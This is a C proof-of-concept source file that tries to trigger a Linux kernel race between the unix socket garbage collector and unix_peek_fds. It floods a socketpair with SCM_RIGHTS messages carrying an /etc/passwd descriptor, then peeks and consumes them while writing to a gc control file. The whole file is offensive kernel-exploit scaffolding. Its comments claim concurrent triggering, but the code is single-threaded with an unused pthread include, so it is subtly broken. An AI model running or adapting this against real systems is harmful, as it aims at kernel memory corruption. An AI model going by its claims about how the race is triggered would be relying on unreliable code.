/*
 * PoC for WMI-3: unix_peek_fds
 * Try to trigger a race between unix_gc and unix_peek_fds
 * by repeatedly sending/peeking sockets in flight.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

#define NUM_MSGS 200

static int sv[2];

void trigger_gc(void)
{
    int fd = open("/proc/sys/net/unix/gc", O_WRONLY);
    if (fd >= 0) {
        write(fd, "1", 1);
        close(fd);
    }
}

int main(int argc, char *argv[])
{
    int fd_to_send;
    struct msghdr msg;
    struct iovec iov;
    char buf[64];
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    struct cmsghdr *cmsg;
    int ret;
    int i;

    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
        perror("socketpair");
        return 1;
    }

    fd_to_send = open("/etc/passwd", O_RDONLY);
    if (fd_to_send < 0) {
        perror("open");
        return 1;
    }

    /* Send many messages with SCM_RIGHTS */
    for (i = 0; i < NUM_MSGS; i++) {
        memset(&msg, 0, sizeof(msg));
        memset(buf, 0x41, sizeof(buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_name = NULL;
        msg.msg_namelen = 0;
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);
        cmsg = CMSG_FIRSTHDR(&msg);
        cmsg->cmsg_level = SOL_SOCKET;
        cmsg->cmsg_type = SCM_RIGHTS;
        cmsg->cmsg_len = CMSG_LEN(sizeof(int));
        *(int *)CMSG_DATA(cmsg) = fd_to_send;

        ret = sendmsg(sv[0], &msg, 0);
        if (ret < 0) {
            perror("sendmsg");
            return 1;
        }
    }
    printf("Sent %d messages\n", NUM_MSGS);

    trigger_gc();

    /* Now peek all messages while triggering GC */
    for (i = 0; i < NUM_MSGS; i++) {
        memset(&msg, 0, sizeof(msg));
        memset(cmsg_buf, 0, sizeof(cmsg_buf));
        memset(buf, 0, sizeof(buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);

        ret = recvmsg(sv[1], &msg, MSG_PEEK | MSG_DONTWAIT);
        if (ret < 0) {
            if (errno == EAGAIN)
                break;
            perror("recvmsg (peek)");
            return 1;
        }

        /* Also try to trigger GC concurrently */
        if (i % 10 == 0)
            trigger_gc();
    }
    printf("Peeked %d messages\n", i);

    /* Consume all */
    for (i = 0; i < NUM_MSGS; i++) {
        memset(&msg, 0, sizeof(msg));
        memset(cmsg_buf, 0, sizeof(cmsg_buf));
        memset(buf, 0, sizeof(buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);

        ret = recvmsg(sv[1], &msg, MSG_DONTWAIT);
        if (ret < 0) {
            if (errno == EAGAIN)
                break;
            perror("recvmsg (consume)");
            return 1;
        }

        cmsg = CMSG_FIRSTHDR(&msg);
        if (cmsg && cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS) {
            int received_fd = *(int *)CMSG_DATA(cmsg);
            if (received_fd >= 0)
                close(received_fd);
        }
    }
    printf("Consumed messages\n");

    close(fd_to_send);
    close(sv[0]);
    close(sv[1]);

    printf("PoC completed\n");
    return 0;
}
